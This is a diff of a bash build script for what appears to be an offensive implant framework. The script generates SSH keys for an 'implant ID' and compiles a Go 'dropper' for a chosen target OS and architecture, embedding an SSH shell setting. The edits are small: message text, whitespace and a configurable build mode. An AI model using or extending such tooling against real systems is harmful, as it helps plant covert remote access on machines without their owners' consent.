@@ -1,10 +1,11 @@
 #!/bin/bash
 
 usage(){
-    echo "Error: $2\n"
+    echo "Message: $2\n"
     echo "Usage: $1 [build.profile]\n"
     exit 1
 }
+
 
 if [[ $# -eq 0 ]]
 then
@@ -35,8 +36,8 @@ cd ${TOP_DIR}
 printf "\n\n\t%s\n" "Cutting Implant ID ${ImplantID} for target (${DropperOS}/${DropperArch})"
 printf "\n%s\n" "### PHASE I:  Implant Generation ###"
 printf "%s\n\n" "------------------------------------"
-echo "[*] Building Keys For ${ImplantID} "
 
+echo "[*] Building Keys For ${ImplantID} "
 go run ${TOOL_DIR}/keygen.go \
        -bits ${SSHServerUserKeyBits}  -pass ${SSHServerUserKeyPassphrase} \
        -pkfile ${SSHServerUserKeyFile}.pk \
@@ -48,8 +49,7 @@ then
     echo
     echo "[*] Building dropper ${ImplantID} (${DropperName}) for ${DropperOS} / ${DropperArch} "
 
-    #go build -ldflags \
-    go build  -buildmode=c-shared -ldflags \
+    go build  -buildmode=${DropperBuildType} -ldflags \
 	"-s -w \
      -X main.ImplantID=${ImplantID}  \
      -X main.SSHShell=${SSHShell}  \
